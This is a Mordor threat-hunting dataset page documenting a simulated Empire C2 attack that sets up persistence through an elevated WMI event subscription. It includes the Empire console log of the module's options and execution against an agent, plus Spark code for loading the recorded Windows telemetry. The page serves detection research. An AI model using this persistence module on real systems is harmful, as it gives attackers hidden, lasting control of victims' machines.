# Empire Elevated WMI Subscription

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518184306 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz |

## Dataset Description
This dataset represents adversaries leveraging WMI subscriptions for persistence.

## Adversary View
```
(Empire: TKV35P8X) > usemodule persistence/elevated/wmi*
(Empire: powershell/persistence/elevated/wmi) > info

              Name: Invoke-WMI
            Module: powershell/persistence/elevated/wmi
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using a permanent WMI
  subscription. This has a difficult detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name        Required    Value                     Description
  ----        --------    -------                   -----------
  DailyTime   False                                 Daily time to trigger the script        
                                                    (HH:mm).                                
  ProxyCreds  False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  ExtFile     False                                 Use an external file for the payload    
                                                    instead of a stager.                    
  Cleanup     False                                 Switch. Cleanup the trigger and any     
                                                    script from specified location.         
  Agent       True        TKV35P8X                  Agent to run module on.                 
  Listener    True                                  Listener to use.                        
  SubName     True        Updater                   Name to use for the event subscription. 
  Proxy       False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  AtStartup   False       True                      Switch. Trigger script (within 5        
                                                    minutes) of system startup.             
  UserAgent   False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  FailedLogon False                                 Trigger script with a failed logon      
                                                    attempt from a specified user           

(Empire: powershell/persistence/elevated/wmi) > set Listener https
(Empire: powershell/persistence/elevated/wmi) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 3
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) > WMI persistence established using listener https with OnStartup WMI subsubscription trigger.

(Empire: powershell/persistence/elevated/wmi) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        